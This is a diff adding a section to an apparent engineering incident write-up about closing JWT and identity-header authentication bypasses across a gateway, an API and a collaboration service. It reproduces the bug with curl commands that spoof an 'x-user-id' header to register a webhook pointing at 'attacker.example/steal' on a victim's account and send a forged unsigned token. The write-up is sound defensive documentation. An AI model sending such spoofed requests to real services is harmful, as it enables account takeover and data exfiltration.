@@ -273,3 +273,161 @@ listing  -> visible as queued
 worker   -> queued -> running -> failed   (AI API unreachable locally; the
             reason is recorded on the row), retried 3x per the queue's backoff
 ```
+
+---
+
+## 7. The rest of the trust boundary
+
+Section 1 describes the bypass fixed in platform-api's `requireAuth` (#82). That
+fix was correct and it was incomplete: the same unverified decode survived in
+three other places, because it was applied as a copy rather than a shared
+dependency. This section covers closing those, and the decision about how.
+
+### 7.1 What was still open
+
+**`services/gateway/src/middleware/authForward.ts`.** The front door. It
+base64-decoded the token and set `x-user-id` / `x-user-role` / `x-user-tier`
+from whatever it found, then proxied to platform-api. It also never removed
+inbound identity headers, so a request that simply set `x-user-id` itself — no
+token at all — had that header forwarded untouched.
+
+The gateway's own suite asserted this was correct. `gateway.test.ts` built a
+token with `const signature = 'fakesignature'` under the name _"forwards
+x-user-id from decoded JWT"_. That test is kept and inverted rather than
+deleted; the header-level assertions now live in `authForward.test.ts`, which
+mounts the middleware on an echo app so it can see what would actually be sent
+upstream. A status-code assertion could not, which is why the original passed
+against a broken implementation.
+
+**`services/platform-api/src/routes/devportal.ts`.** Nine routes, none with
+`requireAuth`, every user-scoped one reading
+`(req.headers['x-user-id'] as string) ?? 'anonymous'`. Reproduced against the
+running service before the fix, with no `Authorization` header at all:
+
+```
+$ curl -X POST localhost:3001/api/v1/developer/webhooks \
+       -H 'x-user-id: victim-user-0001' \
+       -d '{"url":"https://attacker.example/steal","events":["job.completed"]}'
+201 Created  {"userId":"victim-user-0001","url":"https://attacker.example/steal",...}
+
+$ curl localhost:3001/api/v1/developer/webhooks -H 'x-user-id: victim-user-0001'
+200 OK       [ ...the victim's webhooks... ]
+```
+
+That registers an attacker-controlled delivery endpoint on someone else's
+account. The `?? 'anonymous'` fallback made it worse: omit the header entirely
+and every caller shared one identity, so `anonymous`'s sandbox credentials were
+readable by anyone.
+
+After:
+
+```
+$ curl -X POST localhost:3001/api/v1/developer/webhooks \
+       -H 'x-user-id: victim-user-0001' -d '{...}'
+401 {"success":false,"error":{"code":"UNAUTHORIZED","message":"Authentication required"}}
+
+$ curl ... -H "Authorization: Bearer <forged>.<claims>.fakesignature"
+401 {"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid or expired token"}}
+
+$ curl ... -H "Authorization: Bearer <valid token for real-user-9999>" \
+           -H 'x-user-id: victim-user-0001' -d '{...}'
+201 {"userId":"real-user-9999",...}     <- the header is ignored
+```
+
+**`services/collab/src/auth.ts`.** Live on the WebSocket upgrade
+(`index.ts:48`). Decoded without verifying and checked only `exp`, so any client
+could join any project's Yjs document as any user, read and write shared state
+and hold shot locks under that identity. It also carried
+`process.env.JWT_SECRET || 'dev-secret-change-in-production'` — a published
+secret, in a file that reads as though it authenticates.
+
+**Two authorization bugs found in the same sweep**, distinct from the
+authentication ones: `testWebhook` and `getWebhookLogs` took a webhook id and
+never consulted its owner, so any authenticated user could fire deliveries on,
+and read the delivery history of, any webhook whose id they could guess.
+`deleteWebhook` already checked ownership; those two did not. Both now require
+the owner.
+
+### 7.2 Defence in depth: identity headers are stripped
+
+Fixing the gateway is not sufficient on its own. The gateway sets `x-user-id`
+from a verified token, which is a reasonable pattern, but it only holds if
+platform-api is unreachable except through the gateway — and it is not.
+platform-api listens on its own port, addressable directly in development and by
+other pods in the compose and k8s topologies.
+
+`services/platform-api/src/middleware/stripIdentityHeaders.ts` therefore removes
+`x-user-id`, `x-user-role`, `x-user-tier` and `x-user-email` from every inbound
+request before any handler runs. There is no allow-list for a trusted proxy:
+"the request came from the gateway" is only as trustworthy as the network, and
+authentication should not depend on network position. Identity comes from
+`req.user`, populated by `requireAuth` after a signature check, and nothing else.
+
+Fixing devportal closes that route. Stripping closes the class, so the next
+handler that reaches for a convenient header cannot reintroduce it.
+
+### 7.3 Middleware order in the gateway
+
+`authForward` now runs _before_ `globalLimiter` and `requestLogger`. It used to
+run after, and both of those read `x-user-id` — the rate limiter keys its
+buckets on it. A caller could therefore choose their own rate-limit bucket, or
+poison another user's, just by sending the header.
+
+### 7.4 One verifier or three: the decision, and why
+
+Three copies of security-critical verification code is how the next bypass gets
+introduced — this incident is the proof, since #86 fixed one copy and left
+three. Extraction into `packages/shared` was the preferred option and was
+attempted first.
+
+It does not work without restructuring the build of three services. Every
+service sets `rootDir: "src"`, so importing a sibling package's TypeScript
+source fails:
+
+```
+error TS6059: File 'packages/shared/src/jwt.ts' is not under 'rootDir'
+'services/gateway/src'. 'rootDir' is expected to contain all source files.
+```
+
+(The `paths` mapping resolves the module; `rootDir` is the blocker, and it
+fails on `tsc --noEmit` as well as on the build.) The module systems also
+differ — gateway is `commonjs`/`node`, collab is `NodeNext`, platform-api
+extends the root config — so `packages/shared`'s subpath `exports` are
+unreachable from gateway's resolver.
+
+Making it work means either relaxing `rootDir` in three services, which changes
+the `dist/` layout and breaks `"start": "node dist/index.js"` and three
+Dockerfiles, or giving `packages/shared` its own tsconfig and build output and
+wiring build-ordering into CI and those Dockerfiles. That is a build and deploy
+restructure, and it is not something to land inside a security fix.
+
+**So: three copies, deliberately, plus the mechanism the extraction was meant to
+provide.** Each copy carries a header comment naming
+`services/platform-api/src/middleware/auth.ts` as canonical and pointing here.
+More importantly, each service now runs the _same regression suite_ — forged
+unsigned, `alg: none`, wrong secret, expired, no `exp`, no `sub`. If one copy
+drifts, its own tests fail. That is what actually holds them in step; a shared
+module would have been the tidier way to get there.
+
+If someone later restructures the service builds, extracting this is worth
+doing, and the test suites are the safety net for that change.
+
+### 7.5 Fail shut, and why `verifyToken` does not throw
+
+A missing `JWT_SECRET` is caught by the same `catch` that handles a bad
+signature, so `verifyToken` returns `null` rather than throwing. That is
+deliberate and consistent across all three services: no token authenticates
+while a service is misconfigured. It is not "accepts everything", and not
+"throws past the caller" either.
+
+What makes the misconfigured state _loud_ is `assertAuthConfigured()`, called
+from each entrypoint, which refuses to start the process at all. Gateway and
+collab now do this, matching platform-api.
+
+### 7.6 Known, and deliberately not changed
+
+`packages/logger/src/requestLogger.ts` reads `x-user-id` for log annotation. It
+is not an authentication path, and nothing currently depends on
+`@animaforge/logger` — the package has no consumers. It is noted here rather
+than changed, because changing a dormant package as part of this would be scope
+the sweep does not need.
